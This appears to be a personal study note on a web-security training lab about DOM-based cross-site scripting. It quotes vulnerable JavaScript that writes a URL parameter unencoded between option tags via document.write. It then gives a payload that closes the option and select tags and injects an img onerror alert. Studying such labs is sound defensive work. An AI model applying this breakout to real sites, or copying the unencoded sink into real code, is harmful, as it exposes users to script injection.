---
id: "202606250003"
title: DOM XSS by breaking out of a select and option element
date: 2026-06-25
type: case
tags: [xss, dom-xss, document-write, tag-breakout]
source: "[[10_Lab10-DOM XSS in document.write sink using source location.search inside a select element]]"
publish: false
---

```js
var store = (new URLSearchParams(window.location.search)).get('storeId');
document.write('<select name="storeId">');
if (store) { document.write('<option selected>'+store+'</option>'); }
...
document.write('</select>');
```

The `storeId` parameter is written directly between `<option selected>` and `</option>` with no encoding — the injected value just needs to close both the `<option>` and the parent `<select>` before adding a new element:

```
&storeId=</option></select><img/src=x onerror="alert('xss')"/>
```

Same structural idea as [[202606120003 DOM XSS via document.write into an image src attribute]] (source `location.search`, sink `document.write`) but the breakout target is a pair of nested content tags instead of an attribute value — confirming that with `document.write`, the fix is always "figure out exactly which tag(s) enclose your reflection point, and close precisely those" rather than a fixed payload template.

## Links
- Sibling case sharing source/sink family: [[202606120003 DOM XSS via document.write into an image src attribute]]
- Payload construction once breakout succeeds: [[202606130003 Reliable non-script event payloads for DOM and innerHTML sinks]]
